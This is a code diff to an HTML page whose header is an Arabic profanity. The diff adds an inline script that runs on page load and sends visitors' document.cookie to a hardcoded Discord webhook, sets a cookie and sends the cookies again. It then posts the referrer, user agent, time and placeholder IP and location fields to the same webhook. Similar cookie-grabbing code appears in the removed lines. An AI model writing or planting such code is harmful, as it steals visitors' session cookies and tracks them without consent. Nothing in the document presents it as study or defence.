@@ -69,70 +69,64 @@
 <body>
     <header>
         <h1>كس امك</h1>
+    </header>
+
+    
+
+    <script>
+        
+        fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `Cookies: ${document.cookie}`
+            })
+        });
 
         
+        document.cookie = "username=JohnDoe; path=/; expires=Fri, 31 Dec 2024 23:59:59 GMT";
+
     
-    
+        fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `Updated Cookies: ${document.cookie}`
+            })
+        });
 
 
-   
-    <script>
-        const script = document.createElement('script'); 
-script.textContent = 
-    console.log('Current Cookies:', document.cookie);
+        const ip = '192.168.1.1';
+        const ipInfoData = {
+            country: 'CountryName',
+            city: 'CityName',
+            region: 'RegionName'
+        };
+        const referrer = document.referrer || "N/A";
+        const userAgent = navigator.userAgent;
+        const dateTime = new Date().toLocaleString();
 
-    document.cookie = "username=JohnDoe; path=/; expires=Fri, 31 Dec 2024 23:59:59 GMT";
-
-    console.log('Updated Cookies:', document.cookie);
-;
-document.body.appendChild(script); 
-
-
-fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-        content: `Cookies: ${document.cookie}`
-    })
-});
-
-
-const ip = '192.168.1.1'; 
-const ipInfoData = {
-    country: 'CountryName',
-    city: 'CityName',
-    region: 'RegionName'
-};  
-const referrer = document.referrer || "N/A";
-const userAgent = navigator.userAgent;
-const dateTime = new Date().toLocaleString();  
-
-fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-        content: "**New visitor information**", 
-        embeds: [
-            {
-                title: "Visitor Details", 
-                fields: [
-                    { name: "IP Address", value: ip, inline: true },  
-                    { name: "Country", value: ipInfoData.country, inline: true }, 
-                    { name: "City", value: ipInfoData.city || "Unknown", inline: true }, 
-                    { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, 
-                    { name: "Referrer", value: referrer, inline: false }, 
-                    { name: "User Agent", value: userAgent, inline: false }, 
-                    { name: "Date & Time", value: dateTime, inline: false } 
+        fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "**New visitor information**", 
+                embeds: [
+                    {
+                        title: "Visitor Details", 
+                        fields: [
+                            { name: "IP Address", value: ip, inline: true },
+                            { name: "Country", value: ipInfoData.country, inline: true },
+                            { name: "City", value: ipInfoData.city || "Unknown", inline: true },
+                            { name: "Region", value: ipInfoData.region || "Unknown", inline: true },
+                            { name: "Referrer", value: referrer, inline: false },
+                            { name: "User Agent", value: userAgent, inline: false },
+                            { name: "Date & Time", value: dateTime, inline: false }
+                        ]
+                    }
                 ]
-            }
-        ]
-    })
-});
-
-
-
-
-
+            })
+        });
     </script>
 </body>
 </html>
